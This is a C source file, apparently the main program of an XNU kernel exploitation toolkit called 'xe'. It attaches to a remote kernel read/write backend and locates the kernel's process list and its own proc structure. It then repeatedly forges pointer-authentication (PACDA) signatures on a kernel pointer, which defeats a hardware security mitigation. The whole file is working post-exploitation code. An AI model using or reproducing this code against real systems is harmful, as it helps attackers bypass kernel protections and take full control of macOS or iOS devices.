//
//  main.c
//  xe
//
//  Created by admin on 11/20/21.
//

#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "kmem.h"
#include "kmem_remote.h"
#include "slider.h"
#include "platform_variables.h"

#include "xnu_proc.h"
#include "util_pacda.h"

int main(int argc, const char * argv[]) {
    assert(argc == 2);
    
    struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(backend);
    xe_slider_init();
    
    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));

    uintptr_t proc;
    int error = xe_xnu_proc_find(kernproc, getpid(), &proc);
    if (error) {
        printf("[ERROR] cannot find current proc, err: %d\n", error);
        return error;
    }
    
    printf("[INFO] pid: %d\n", getpid());
    printf("[INFO] proc: %p\n", (void*)proc);
    
    for (int i=0; i<10; i++) {
        uintptr_t ptr = kernproc;
        uintptr_t ctx = 0xabcdef;
        uintptr_t signed_ptr;
        
        error = xe_util_pacda_sign(proc, ptr, ctx, &signed_ptr);
        if (error) {
            printf("[ERROR] ptr sign failed, err: %d\n", error);
            return error;
        }
        
        printf("[INFO] signed ptr: %p\n", (void*)signed_ptr);
    }
    
    return 0;
}
